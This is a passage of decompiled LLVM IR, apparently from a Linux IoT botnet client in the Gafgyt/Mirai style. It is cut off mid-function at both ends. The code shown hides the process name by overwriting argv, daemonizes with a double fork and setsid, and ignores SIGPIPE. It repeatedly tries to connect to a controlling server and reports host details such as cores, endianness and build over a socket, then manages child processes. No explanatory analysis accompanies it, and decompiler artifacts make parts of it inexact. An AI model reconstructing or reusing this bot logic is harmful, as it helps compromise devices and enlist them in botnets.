  %v3_804d2c9 = phi i32 [ %v3_804d2c9.pre, %dec_label_pc_804d2ad ], [ 0, %dec_label_pc_804d2bd ]
  ret i32 %v3_804d2c9

; uselistorder directives
  uselistorder i32 %v5_804d1e8, { 1, 0 }
  uselistorder i32 %v2_804d218, { 2, 4, 0, 3, 1 }
  uselistorder i32 %v5_804d1b5, { 2, 1, 0 }
  uselistorder i32 %v5_804d0da, { 2, 1, 3, 4, 0 }
  uselistorder i32* %stack_var_-4204, { 1, 0 }
  uselistorder i32* %stack_var_-60, { 1, 0 }
  uselistorder i8* %stack_var_-4156, { 4, 2, 0, 1, 3 }
  uselistorder i32 (i32)* @__libc_close, { 31, 30, 29, 1, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 0, 9, 8, 7, 6, 5, 4, 3, 2 }
  uselistorder i8 9, { 1, 0, 2, 3 }
  uselistorder i32 (i32, i32, i32)* @__libc_connect, { 3, 2, 1, 4, 0 }
  uselistorder i32 (i32)* @htons, { 11, 10, 0, 9, 8, 7, 6, 5, 4, 12, 3, 2, 1 }
  uselistorder i32 (i32)* @inet_addr, { 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @socket, { 6, 5, 4, 3, 2, 1, 0, 7 }
  uselistorder label %dec_label_pc_804d2c9, { 1, 0 }
  uselistorder label %dec_label_pc_804d28a, { 1, 0 }
  uselistorder label %dec_label_pc_804d236, { 1, 2, 0 }
  uselistorder label %dec_label_pc_804d1e8, { 1, 0 }
  uselistorder label %dec_label_pc_804d1c2, { 1, 0 }
}

define i32 @main(i32 %argc, i8** %argv) local_unnamed_addr {
entry:
  %cf.global-to-local = alloca i1, align 1
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-36 = alloca i8*, align 4
  %tmp132 = call i8* @__decompiler_undefined_function_1()
  %tmp133 = call i8* @__decompiler_undefined_function_1()
  %tmp134 = call i32 @__decompiler_undefined_function_0()
  %tmp152 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-132 = alloca i32, align 4
  %stack_var_-1156 = alloca i32, align 4
  %stack_var_-5252 = alloca i32, align 4
  %stack_var_-92 = alloca i32, align 4
  %stack_var_-5424 = alloca i8*, align 4
  %stack_var_-5408 = alloca i32, align 4
  %stack_var_-5392 = alloca i32, align 4
  %stack_var_4 = alloca i32, align 4
  %v2_804d2d1 = ptrtoint i32* %stack_var_4 to i32
  %v5_804d2ee = icmp ult i32* %stack_var_-5392, inttoptr (i32 12 to i32*)
  store i1 %v5_804d2ee, i1* %cf.global-to-local, align 1
  store i32 0, i32* %stack_var_-5408, align 4
  %v2_804d2f3 = call i32 @__GI_time(i32* null)
  store i32 %v2_804d2f3, i32* %eax.global-to-local, align 4
  %v0_804d2f8 = load i32, i32* @esp, align 4
  %v2_804d2f8 = icmp ugt i32 %v0_804d2f8, -17
  store i1 %v2_804d2f8, i1* %cf.global-to-local, align 1
  store i32 %v2_804d2f3, i32* @ebx, align 4
  %v0_804d2fd = call i32 @__libc_getpid()
  %v1_804d302 = load i32, i32* @ebx, align 4
  %v2_804d302 = xor i32 %v1_804d302, %v0_804d2fd
  store i32 %v2_804d302, i32* @eax, align 4
  %v0_804d304 = load i32, i32* @esp, align 4
  %v5_804d304 = icmp ult i32 %v0_804d304, 12
  store i1 %v5_804d304, i1* %cf.global-to-local, align 1
  store i32 %v2_804d302, i32* %stack_var_-5408, align 4
  %v1_804d308 = call i32 @srand(i32 %v2_804d302)
  store i32 %v1_804d308, i32* %eax.global-to-local, align 4
  store i1 %v5_804d2ee, i1* %cf.global-to-local, align 1
  store i32 0, i32* %stack_var_-5408, align 4
  %v2_804d315 = call i32 @__GI_time(i32* null)
  store i32 %v2_804d315, i32* %eax.global-to-local, align 4
  %v0_804d31a = load i32, i32* @esp, align 4
  %v2_804d31a = icmp ugt i32 %v0_804d31a, -17
  store i1 %v2_804d31a, i1* %cf.global-to-local, align 1
  store i32 %v2_804d315, i32* @ebx, align 4
  %v0_804d31f = call i32 @__libc_getpid()
  %v1_804d324 = load i32, i32* @ebx, align 4
  %v2_804d324 = xor i32 %v1_804d324, %v0_804d31f
  store i1 false, i1* %cf.global-to-local, align 1
  store i32 %v2_804d324, i32* %eax.global-to-local, align 4
  %v1_804d327 = call i32 @init_rand(i32 %v2_804d324)
  store i32 %v1_804d327, i32* %eax.global-to-local, align 4
  %v0_804d32c = load i32, i32* @esp, align 4
  %v5_804d32c = icmp ugt i32 %v0_804d32c, -5
  store i1 %v5_804d32c, i1* %cf.global-to-local, align 1
  %v0_804d32f = call i32 @getOurIP()
  store i32 %v0_804d32f, i32* %eax.global-to-local, align 4
  store i32 %v2_804d2d1, i32* %edx.global-to-local, align 4
  %v1_804d33a = add i32 %v2_804d2d1, 4
  %v2_804d33a = inttoptr i32 %v1_804d33a to i32*
  %v3_804d33a = load i32, i32* %v2_804d33a, align 4
  store i32 %v3_804d33a, i32* %eax.global-to-local, align 4
  %v1_804d33d = inttoptr i32 %v3_804d33a to i32*
  %v2_804d33d = load i32, i32* %v1_804d33d, align 4
  %v1_804d34a = and i32 %v2_804d33d, -256
  store i32 %v1_804d34a, i32* %eax.global-to-local, align 4
  %v4_804d34d = inttoptr i32 %v2_804d33d to i8*
  store i32 %v2_804d33d, i32* @edi, align 4
  %v3_804d353 = call i32 @_strlen(i8* %v4_804d34d)
  %v4_804d353 = mul i32 %v3_804d353, -1
  %v1_804d357 = sub i32 1, %v4_804d353
  store i32 %v1_804d357, i32* %eax.global-to-local, align 4
  %v1_804d359 = sub i32 0, %v4_804d353
  store i32 %v1_804d359, i32* %edx.global-to-local, align 4
  %v3_804d362 = load i32, i32* %v2_804d33a, align 4
  store i32 %v3_804d362, i32* %eax.global-to-local, align 4
  %v1_804d365 = inttoptr i32 %v3_804d362 to i32*
  %v2_804d365 = load i32, i32* %v1_804d365, align 4
  store i32 %v2_804d365, i32* %eax.global-to-local, align 4
  %v0_804d367 = load i32, i32* @esp, align 4
  %v5_804d367 = icmp ult i32 %v0_804d367, 4
  store i1 %v5_804d367, i1* %cf.global-to-local, align 1
  store i32 %v2_804d365, i32* %stack_var_-5408, align 4
  %v4_804d371 = inttoptr i32 %v2_804d365 to i8*
  %v5_804d371 = call i32 @strncpy(i8* %v4_804d371, i32 ptrtoint ([6 x i8]* @global_var_8052a5f.70 to i32), i32 %v1_804d359)
  store i32 1, i32* %eax.global-to-local, align 4
  %v3_804d3d6260 = load i32, i32* %stack_var_4, align 4
  %v9_804d3d6261 = icmp ugt i32 %v3_804d3d6260, 1
  store i1 %v9_804d3d6261, i1* %cf.global-to-local, align 1
  %v5_804d3d8263 = icmp sgt i32 %v3_804d3d6260, 1
  br i1 %v5_804d3d8263, label %dec_label_pc_804d382, label %dec_label_pc_804d3da

dec_label_pc_804d382:                             ; preds = %entry, %dec_label_pc_804d382
  %storemerge23264 = phi i32 [ %v4_804d3ca, %dec_label_pc_804d382 ], [ 1, %entry ]
  %v2_804d385 = mul i32 %storemerge23264, 4
  store i32 %v2_804d385, i32* %eax.global-to-local, align 4
  %v4_804d38e = load i32, i32* %v2_804d33a, align 4
  %v5_804d38e = add i32 %v4_804d38e, %v2_804d385
  %v10_804d38e = icmp ult i32 %v5_804d38e, %v2_804d385
  store i1 %v10_804d38e, i1* %cf.global-to-local, align 1
  store i32 %v5_804d38e, i32* %eax.global-to-local, align 4
  %v1_804d391 = inttoptr i32 %v5_804d38e to i32*
  %v2_804d391 = load i32, i32* %v1_804d391, align 4
  %v1_804d39e = and i32 %v2_804d391, -256
  store i32 %v1_804d39e, i32* %eax.global-to-local, align 4
  %v4_804d3a1 = inttoptr i32 %v2_804d391 to i8*
  %v3_804d3a7 = call i32 @_strlen(i8* %v4_804d3a1)
  store i32 %v3_804d3a7, i32* %edx.global-to-local, align 4
  store i32 %v2_804d385, i32* %eax.global-to-local, align 4
  %v4_804d3bc = load i32, i32* %v2_804d33a, align 4
  %v5_804d3bc = add i32 %v4_804d3bc, %v2_804d385
  %v10_804d3bc = icmp ult i32 %v5_804d3bc, %v2_804d385
  store i1 %v10_804d3bc, i1* %cf.global-to-local, align 1
  store i32 %v5_804d3bc, i32* %eax.global-to-local, align 4
  %v1_804d3bf = inttoptr i32 %v5_804d3bc to i32*
  %v2_804d3bf = load i32, i32* %v1_804d3bf, align 4
  %v1_804d3c1 = inttoptr i32 %v2_804d3bf to i8*
  store i32 %v2_804d3bf, i32* @edi, align 4
  %v1_804d3c6 = and i32 %v2_804d3bf, -256
  store i32 %v1_804d3c6, i32* %eax.global-to-local, align 4
  %v5_804d3c8 = call i8* @_memset(i8* %v1_804d3c1, i32 %v1_804d3c6, i32 %v3_804d3a7)
  %v4_804d3ca = add i32 %storemerge23264, 1
  store i32 %v4_804d3ca, i32* %eax.global-to-local, align 4
  %v3_804d3d6 = load i32, i32* %stack_var_4, align 4
  %v9_804d3d6 = icmp ult i32 %v4_804d3ca, %v3_804d3d6
  store i1 %v9_804d3d6, i1* %cf.global-to-local, align 1
  %v5_804d3d8 = icmp slt i32 %v4_804d3ca, %v3_804d3d6
  br i1 %v5_804d3d8, label %dec_label_pc_804d382, label %dec_label_pc_804d3da

dec_label_pc_804d3da:                             ; preds = %dec_label_pc_804d382, %entry
  %v0_804d3da = call i32 @getCoresAmount()
  store i32 %v0_804d3da, i32* %eax.global-to-local, align 4
  store i32 %v0_804d3da, i32* @ebx, align 4
  %v0_804d3e1 = call i32 @getEndianness()
  store i32 %v0_804d3e1, i32* %eax.global-to-local, align 4
  store i32 %v0_804d3e1, i32* @esi, align 4
  %v0_804d3e8 = call i32 @getBuild()
  store i32 %v0_804d3e8, i32* %eax.global-to-local, align 4
  %v0_804d3ed = load i32, i32* @esp, align 4
  %v5_804d3ed = icmp ult i32 %v0_804d3ed, 8
  store i1 %v5_804d3ed, i1* %cf.global-to-local, align 1
  %v0_804d3f5 = load i32, i32* @ebx, align 4
  store i32 %v0_804d3f5, i32* %stack_var_-5408, align 4
  %v0_804d3f6 = load i32, i32* @esi, align 4
  %v5_804d3f6 = inttoptr i32 %v0_804d3f6 to i8*
  store i8* getelementptr inbounds ([46 x i8], [46 x i8]* @global_var_8052a74.73, i32 0, i32 0), i8** %stack_var_-5424, align 4
  %tmp187 = inttoptr i32 %v0_804d3e8 to i8*
  %v16_804d402 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([46 x i8], [46 x i8]* @global_var_8052a74.73, i32 0, i32 0), i8* bitcast (i8** @global_var_8052a6b.72 to i8*), i8* %tmp187, i8* %v5_804d3f6, i32 %v0_804d3f5, i8* bitcast (i32* @global_var_8052a65.71 to i8*))
  store i32 %v16_804d402, i32* %eax.global-to-local, align 4
  %v0_804d407 = load i32, i32* @esp, align 4
  %v2_804d407 = icmp ugt i32 %v0_804d407, -33
  store i1 %v2_804d407, i1* %cf.global-to-local, align 1
  %v0_804d40a = load i8*, i8** %stack_var_-5424, align 4
  %v1_804d40a = ptrtoint i8* %v0_804d40a to i32
  %v2_804d40a = call i32 @__libc_fork(i32 %v1_804d40a)
  store i32 %v2_804d40a, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804d412 = icmp eq i32 %v2_804d40a, 0
  br i1 %v4_804d412, label %dec_label_pc_804d43c, label %dec_label_pc_804d436.thread

dec_label_pc_804d436.thread:                      ; preds = %dec_label_pc_804d3da
  %v0_804d418 = load i32, i32* @esp, align 4
  %v5_804d418 = icmp ult i32 %v0_804d418, 4
  store i1 %v5_804d418, i1* %cf.global-to-local, align 1
  %v2_804d41d = ptrtoint i32* %stack_var_-92 to i32
  store i32 %v2_804d41d, i32* %eax.global-to-local, align 4
  store i32 %v2_804d40a, i32* %stack_var_-5408, align 4
  %v4_804d424 = call i32 @__libc_waitpid(i32 %v2_804d40a, i32 %v2_804d41d, i32 0)
  store i32 %v4_804d424, i32* @eax, align 4
  store i1 %v5_804d2ee, i1* %cf.global-to-local, align 1
  store i32 0, i32* %stack_var_-5408, align 4
  %v1_804d431 = call i32 @__GI_exit(i32 0)
  store i32 %v1_804d431, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804d454

dec_label_pc_804d43c:                             ; preds = %dec_label_pc_804d3da
  store i1 false, i1* %cf.global-to-local, align 1
  %v0_804d43c = load i32, i32* %stack_var_-5408, align 4
  %v1_804d43c = call i32 @__libc_fork(i32 %v0_804d43c)
  store i32 %v1_804d43c, i32* @eax, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804d444 = icmp eq i32 %v1_804d43c, 0
  br i1 %v4_804d444, label %dec_label_pc_804d454, label %dec_label_pc_804d44a

dec_label_pc_804d44a:                             ; preds = %dec_label_pc_804d43c
  %v0_804d44a = load i32, i32* @esp, align 4
  %v5_804d44a = icmp ult i32 %v0_804d44a, 12
  store i1 %v5_804d44a, i1* %cf.global-to-local, align 1
  store i32 0, i32* %stack_var_-5408, align 4
  %v1_804d44f = call i32 @__GI_exit(i32 0)
  store i32 %v1_804d44f, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804d454

dec_label_pc_804d454:                             ; preds = %dec_label_pc_804d436.thread, %dec_label_pc_804d43c, %dec_label_pc_804d44a
  %v0_804d454 = call i32 @__GI_setsid()
  store i32 %v0_804d454, i32* %eax.global-to-local, align 4
  %v0_804d459 = load i32, i32* @esp, align 4
  %v5_804d459 = icmp ult i32 %v0_804d459, 12
  store i1 %v5_804d459, i1* %cf.global-to-local, align 1
  store i32 ptrtoint (i32* @global_var_8052aa2.74 to i32), i32* %stack_var_-5408, align 4
  %v1_804d461 = call i32 @chdir(i32 ptrtoint (i32* @global_var_8052aa2.74 to i32))
  store i32 %v1_804d461, i32* %eax.global-to-local, align 4
  %v5_804d469 = icmp ult i32* %stack_var_-5392, inttoptr (i32 8 to i32*)
  store i1 %v5_804d469, i1* %cf.global-to-local, align 1
  store i32 13, i32* %stack_var_-5408, align 4
  %v3_804d470 = call i32 @__bsd_signal(i32 13, i32 1)
  store i32 %v3_804d470, i32* %eax.global-to-local, align 4
  %v0_804d475 = load i32, i32* @esp, align 4
  %v2_804d475 = icmp ugt i32 %v0_804d475, -17
  store i1 %v2_804d475, i1* %cf.global-to-local, align 1
  %v2_804dcdd = ptrtoint i32* %stack_var_-5252 to i32
  %tmp189 = bitcast i32* %stack_var_-5252 to i8*
  %tmp190 = bitcast i8** %stack_var_-36 to i32*
  %v2_804dc9a = ptrtoint i32* %stack_var_-132 to i32
  %v2_804dae6 = ptrtoint i32* %stack_var_-1156 to i32
  %v5_804d959 = and i32 %v2_804dcdd, -256
  %v1_804d966 = or i32 %v2_804dcdd, 1
  %storemerge19216 = inttoptr i32 %v1_804d966 to i8*
  br label %dec_label_pc_804d47a.outer

dec_label_pc_804d47a.outer:                       ; preds = %dec_label_pc_804dcdd, %dec_label_pc_804d454
  %stack_var_-28.0.ph = phi i32 [ %tmp, %dec_label_pc_804d454 ], [ %stack_var_-28.1.ph, %dec_label_pc_804dcdd ]
  %stack_var_-52.0.ph = phi i8* [ %tmp132, %dec_label_pc_804d454 ], [ %stack_var_-52.1.ph31, %dec_label_pc_804dcdd ]
  %stack_var_-68.0.ph = phi i8* [ %tmp133, %dec_label_pc_804d454 ], [ %stack_var_-68.2.ph35, %dec_label_pc_804dcdd ]
  %stack_var_-64.0.ph = phi i32 [ %tmp152, %dec_label_pc_804d454 ], [ %stack_var_-64.3, %dec_label_pc_804dcdd ]
  %v0_804d47a60 = call i32 @initConnection()
  store i32 %v0_804d47a60, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804d47f61 = icmp eq i32 %v0_804d47a60, 0
  br i1 %v1_804d47f61, label %dec_label_pc_804d4ac, label %dec_label_pc_804d483

dec_label_pc_804d483:                             ; preds = %dec_label_pc_804d47a.outer, %dec_label_pc_804d483
  %v0_804d483 = load i32, i32* @esp, align 4
  %v5_804d483 = icmp ult i32 %v0_804d483, 4
  store i1 %v5_804d483, i1* %cf.global-to-local, align 1
  %v1_804d486 = add i32 %v0_804d483, -8
  %v2_804d486 = inttoptr i32 %v1_804d486 to i32*
  store i32 ptrtoint (i32* @global_var_8052a65.71 to i32), i32* %v2_804d486, align 4
  %v1_804d48b = add i32 %v0_804d483, -12
  %v2_804d48b = inttoptr i32 %v1_804d48b to i32*
  store i32 ptrtoint (i8** @global_var_8052a6b.72 to i32), i32* %v2_804d48b, align 4
  %v1_804d490 = add i32 %v0_804d483, -16
  %v2_804d490 = inttoptr i32 %v1_804d490 to i32*
  store i32 ptrtoint ([38 x i8]* @global_var_8052aa4.75 to i32), i32* %v2_804d490, align 4
  %v1_804d495 = call i32 (i8*, ...) @printf(i8* bitcast (i32* @0 to i8*))
  store i32 %v1_804d495, i32* %eax.global-to-local, align 4
  %v0_804d49a = load i32, i32* @esp, align 4
  %v1_804d49a = add i32 %v0_804d49a, 16
  %v5_804d49d = icmp ult i32 %v1_804d49a, 12
  store i1 %v5_804d49d, i1* %cf.global-to-local, align 1
  %v2_804d4a0 = inttoptr i32 %v0_804d49a to i32*
  store i32 5, i32* %v2_804d4a0, align 4
  %v0_804d4a2 = call i32 @sleep()
  store i32 %v0_804d4a2, i32* %eax.global-to-local, align 4
  %v0_804d4a7 = load i32, i32* @esp, align 4
  %v2_804d4a7 = icmp ugt i32 %v0_804d4a7, -17
  store i1 %v2_804d4a7, i1* %cf.global-to-local, align 1
  %v0_804d47a = call i32 @initConnection()
  store i32 %v0_804d47a, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804d47f = icmp eq i32 %v0_804d47a, 0
  br i1 %v1_804d47f, label %dec_label_pc_804d4ac, label %dec_label_pc_804d483

dec_label_pc_804d4ac:                             ; preds = %dec_label_pc_804d483, %dec_label_pc_804d47a.outer
  %v0_804d4ac = call i32 @getCoresAmount()
  store i32 %v0_804d4ac, i32* %eax.global-to-local, align 4
  store i32 %v0_804d4ac, i32* @ebx, align 4
  %v0_804d4b3 = call i32 @getEndianness()
  store i32 %v0_804d4b3, i32* %eax.global-to-local, align 4
  store i32 %v0_804d4b3, i32* @esi, align 4
  %v0_804d4ba = call i32 @getBuild()
  store i32 %v0_804d4ba, i32* %eax.global-to-local, align 4
  %v0_804d4bf = load i32, i32* @global_var_8055420.26, align 32
  store i32 %v0_804d4bf, i32* %edx.global-to-local, align 4
  %v0_804d4c5 = load i32, i32* @esp, align 4
  %v5_804d4c5 = icmp ult i32 %v0_804d4c5, 12
  store i1 %v5_804d4c5, i1* %cf.global-to-local, align 1
  %v0_804d4c8 = load i32, i32* @ebx, align 4
  %v2_804d4c8 = add i32 %v0_804d4c5, -16
  %v3_804d4c8 = inttoptr i32 %v2_804d4c8 to i32*
  store i32 %v0_804d4c8, i32* %v3_804d4c8, align 4
  %v0_804d4c9 = load i32, i32* @esi, align 4
  %v2_804d4c9 = add i32 %v0_804d4c5, -20
  %v3_804d4c9 = inttoptr i32 %v2_804d4c9 to i32*
  store i32 %v0_804d4c9, i32* %v3_804d4c9, align 4
  %v2_804d4ca = add i32 %v0_804d4c5, -24
  %v3_804d4ca = inttoptr i32 %v2_804d4ca to i32*
  store i32 %v0_804d4ba, i32* %v3_804d4ca, align 4
  %v1_804d4cb = add i32 %v0_804d4c5, -28
  %v2_804d4cb = inttoptr i32 %v1_804d4cb to i32*
  store i32 ptrtoint ([17 x i8]* @global_var_8052aca.76 to i32), i32* %v2_804d4cb, align 4
  %v0_804d4d0 = load i32, i32* %edx.global-to-local, align 4
  %v2_804d4d0 = add i32 %v0_804d4c5, -32
  %v3_804d4d0 = inttoptr i32 %v2_804d4d0 to i32*
  store i32 %v0_804d4d0, i32* %v3_804d4d0, align 4
  %v0_804d4d1 = load i32, i32* %stack_var_-5408, align 4
  %v3_804d4d1 = call i32 @sockprintf(i32 %v0_804d4d1, i32 1)
  store i32 %v3_804d4d1, i32* %eax.global-to-local, align 4
  %v0_804d4d6 = load i32, i32* @esp, align 4
  %v2_804d4d6 = icmp ugt i32 %v0_804d4d6, -33
  store i1 %v2_804d4d6, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804dcdd.outer

dec_label_pc_804d4f8:                             ; preds = %dec_label_pc_804d6ed, %dec_label_pc_804d6a1
  %v2_804d4fb = mul i32 %storemerge20, 4
  store i32 %v2_804d4fb, i32* %edx.global-to-local, align 4
  %v0_804d500 = load i32, i32* @global_var_805b4a8.30, align 8
  %v2_804d505 = add i32 %v0_804d500, %v2_804d4fb
  store i32 %v2_804d505, i32* %eax.global-to-local, align 4
  %v1_804d508 = inttoptr i32 %v2_804d505 to i32*
  %v2_804d508 = load i32, i32* %v1_804d508, align 4
  store i32 %v2_804d508, i32* %eax.global-to-local, align 4
  %tmp302 = and i32 %v0_804d50a.in, -4
  %v5_804d50a = icmp eq i32 %tmp302, -16
  store i1 %v5_804d50a, i1* %cf.global-to-local, align 1
  %v1_804d50d = add i32 %v0_804d50a.in, 8
  %v2_804d50d = inttoptr i32 %v1_804d50d to i32*
  store i32 1, i32* %v2_804d50d, align 4
  %v1_804d50f = add i32 %v0_804d50a.in, 4
  %v2_804d50f = inttoptr i32 %v1_804d50f to i32*
  store i32 0, i32* %v2_804d50f, align 4
  %v0_804d511 = load i32, i32* %eax.global-to-local, align 4
  %v3_804d511 = inttoptr i32 %v0_804d50a.in to i32*
  store i32 %v0_804d511, i32* %v3_804d511, align 4
  %v4_804d512 = call i32 @__libc_waitpid(i32 %storemerge20, i32 %v2_804d512, i32 %stack_var_-64.2)
  store i32 %v4_804d512, i32* %eax.global-to-local, align 4
  %v0_804d517 = load i32, i32* @esp, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp191 = icmp slt i32 %v4_804d512, 1
  %.pre = add i32 %storemerge20, 1
  br i1 %tmp191, label %dec_label_pc_804d69e, label %dec_label_pc_804d522

dec_label_pc_804d522:                             ; preds = %dec_label_pc_804d4f8
  store i32 %.pre, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804d555

dec_label_pc_804d52b:                             ; preds = %dec_label_pc_804d555, %dec_label_pc_804d58f
  %v2_804d52e = mul i32 %storemerge22, 4
  %v0_804d533 = load i32, i32* @global_var_805b4a8.30, align 8
  %v2_804d538 = add i32 %v0_804d533, %v2_804d52e
  %v1_804d53b = add i32 %v2_804d538, -4
  store i32 %v2_804d52e, i32* %edx.global-to-local, align 4
  store i32 %v2_804d538, i32* %eax.global-to-local, align 4
  %v1_804d54e = inttoptr i32 %v2_804d538 to i32*
  %v2_804d54e = load i32, i32* %v1_804d54e, align 4
  store i32 %v2_804d54e, i32* %eax.global-to-local, align 4
  %v2_804d550 = inttoptr i32 %v1_804d53b to i32*
  store i32 %v2_804d54e, i32* %v2_804d550, align 4
  %v4_804d552 = add i32 %storemerge22, 1
  br label %dec_label_pc_804d555

dec_label_pc_804d555:                             ; preds = %dec_label_pc_804d522, %dec_label_pc_804d52b
  %storemerge22 = phi i32 [ %v4_804d552, %dec_label_pc_804d52b ], [ %.pre, %dec_label_pc_804d522 ]
  store i32 %storemerge22, i32* %eax.global-to-local, align 4
  %v0_804d569 = load i32, i32* @global_var_8055428.28, align 8
  store i32 %v0_804d569, i32* %edx.global-to-local, align 4
  %v0_804d56f = load i32, i32* @global_var_805542c.29, align 4
  %v10_804d587 = icmp eq i32 %v0_804d56f, 0
  br i1 %v10_804d587, label %dec_label_pc_804d58f, label %dec_label_pc_804d52b

dec_label_pc_804d58f:                             ; preds = %dec_label_pc_804d555
  store i32 0, i32* @esi, align 4
  store i32 %v0_804d569, i32* @edi, align 4
  %v10_804d5a3 = icmp ult i32 %storemerge22, %v0_804d569
  br i1 %v10_804d5a3, label %dec_label_pc_804d52b, label %dec_label_pc_804d5ab

dec_label_pc_804d5ab:                             ; preds = %dec_label_pc_804d58f
  %v2_804d5ae = mul i32 %storemerge22, 4
  %v0_804d5b3 = load i32, i32* @global_var_805b4a8.30, align 8
  %v2_804d5b8 = add i32 %v2_804d5ae, -4
  %v1_804d5bb = add i32 %v2_804d5b8, %v0_804d5b3
  %v1_804d5be = inttoptr i32 %v1_804d5bb to i32*
  store i32 0, i32* %v1_804d5be, align 4
  %v0_804d5c4 = load i32, i32* @global_var_8055428.28, align 8
  %v0_804d5c9 = load i32, i32* @global_var_805542c.29, align 4
  %v1_804d5cf = add i32 %v0_804d5c4, -1
  %v4_804d5cf = icmp ne i32 %v0_804d5c4, 0
  %v2_804d5d2 = zext i1 %v4_804d5cf to i32
  %v3_804d5d2 = add i32 %v0_804d5c9, -1
  %v4_804d5d2 = add i32 %v3_804d5d2, %v2_804d5d2
  store i32 %v1_804d5cf, i32* @global_var_8055428.28, align 8
  store i32 %v4_804d5d2, i32* @global_var_805542c.29, align 4
  %v3_804d5eb = mul i32 %v4_804d5d2, 4
  %v4_804d5eb = udiv i32 %v1_804d5cf, 1073741824
  %v5_804d5eb = or i32 %v3_804d5eb, %v4_804d5eb
  store i32 %v5_804d5eb, i32* %edx.global-to-local, align 4
  %v2_804d5ef = mul i32 %v1_804d5cf, 4
  %v1_804d5f2 = add i32 %v2_804d5ef, 4
  store i32 %v1_804d5f2, i32* %eax.global-to-local, align 4
  %v0_804d5f5 = load i32, i32* @esp, align 4
  %v5_804d5f5 = icmp ult i32 %v0_804d5f5, 12
  store i1 %v5_804d5f5, i1* %cf.global-to-local, align 1
  %v2_804d5f8 = add i32 %v0_804d5f5, -16
  %v3_804d5f8 = inttoptr i32 %v2_804d5f8 to i32*
  store i32 %v1_804d5f2, i32* %v3_804d5f8, align 4
  %v1_804d5f9 = call i32 @malloc(i32 0)
  store i32 %v1_804d5f9, i32* %eax.global-to-local, align 4
  %v0_804d5fe = load i32, i32* @esp, align 4
  %v2_804d5fe = icmp ugt i32 %v0_804d5fe, -17
  store i1 %v2_804d5fe, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804d62f

dec_label_pc_804d60d:                             ; preds = %dec_label_pc_804d62f, %dec_label_pc_804d669
  %v2_804d610 = mul i32 %storemerge21, 4
  %v5_804d615 = add i32 %v2_804d610, %v1_804d5f9
  store i32 %v2_804d610, i32* %edx.global-to-local, align 4
  %v0_804d620 = load i32, i32* @global_var_805b4a8.30, align 8
  %v2_804d625 = add i32 %v0_804d620, %v2_804d610
  store i32 %v2_804d625, i32* %eax.global-to-local, align 4
  %v1_804d628 = inttoptr i32 %v2_804d625 to i32*
  %v2_804d628 = load i32, i32* %v1_804d628, align 4
  store i32 %v2_804d628, i32* %eax.global-to-local, align 4
  %v2_804d62a = inttoptr i32 %v5_804d615 to i32*
  store i32 %v2_804d628, i32* %v2_804d62a, align 4
  %v4_804d62c = add i32 %storemerge21, 1
  br label %dec_label_pc_804d62f

dec_label_pc_804d62f:                             ; preds = %dec_label_pc_804d5ab, %dec_label_pc_804d60d
  %storemerge21 = phi i32 [ %v4_804d62c, %dec_label_pc_804d60d ], [ 0, %dec_label_pc_804d5ab ]
  store i32 %storemerge21, i32* %eax.global-to-local, align 4
  %v0_804d643 = load i32, i32* @global_var_8055428.28, align 8
  store i32 %v0_804d643, i32* %edx.global-to-local, align 4
  %v0_804d649 = load i32, i32* @global_var_805542c.29, align 4
  %v10_804d661 = icmp eq i32 %v0_804d649, 0
  br i1 %v10_804d661, label %dec_label_pc_804d669, label %dec_label_pc_804d60d

dec_label_pc_804d669:                             ; preds = %dec_label_pc_804d62f
  store i32 0, i32* @esi, align 4
  store i32 %v0_804d643, i32* @edi, align 4
  %v10_804d67d = icmp ult i32 %storemerge21, %v0_804d643
  br i1 %v10_804d67d, label %dec_label_pc_804d60d, label %dec_label_pc_804d685

dec_label_pc_804d685:                             ; preds = %dec_label_pc_804d669
  %v0_804d685 = load i32, i32* @global_var_805b4a8.30, align 8
  store i32 %v0_804d685, i32* %eax.global-to-local, align 4
  %v0_804d68a = load i32, i32* @esp, align 4
  %v5_804d68a = icmp ult i32 %v0_804d68a, 12
  store i1 %v5_804d68a, i1* %cf.global-to-local, align 1
  %v2_804d68d = add i32 %v0_804d68a, -16
  %v3_804d68d = inttoptr i32 %v2_804d68d to i32*
  store i32 %v0_804d685, i32* %v3_804d68d, align 4
  %v1_804d68e = call i32 @free(i32 0)
  %v0_804d693 = load i32, i32* @esp, align 4
  %v2_804d693 = icmp ugt i32 %v0_804d693, -17
  store i1 %v2_804d693, i1* %cf.global-to-local, align 1
  store i32 %v1_804d5f9, i32* %eax.global-to-local, align 4
  store i32 %v1_804d5f9, i32* @global_var_805b4a8.30, align 8
  br label %dec_label_pc_804d69e

dec_label_pc_804d69e:                             ; preds = %dec_label_pc_804d4f8, %dec_label_pc_804d685
  %v0_804d50a111.in = phi i32 [ %v0_804d693, %dec_label_pc_804d685 ], [ %v0_804d517, %dec_label_pc_804d4f8 ]
  %stack_var_-64.1 = phi i32 [ %v1_804d5f9, %dec_label_pc_804d685 ], [ %stack_var_-64.2, %dec_label_pc_804d4f8 ]
  br label %dec_label_pc_804d6a1

dec_label_pc_804d6a1:                             ; preds = %dec_label_pc_804dcdd, %dec_label_pc_804d69e
  %v0_804d50a.in = phi i32 [ %v0_804d50a111.in, %dec_label_pc_804d69e ], [ %v0_804dcf8, %dec_label_pc_804dcdd ]
  %stack_var_-64.2 = phi i32 [ %stack_var_-64.1, %dec_label_pc_804d69e ], [ %stack_var_-64.3, %dec_label_pc_804dcdd ]
  %storemerge20 = phi i32 [ %.pre, %dec_label_pc_804d69e ], [ 0, %dec_label_pc_804dcdd ]
  store i32 %storemerge20, i32* %eax.global-to-local, align 4
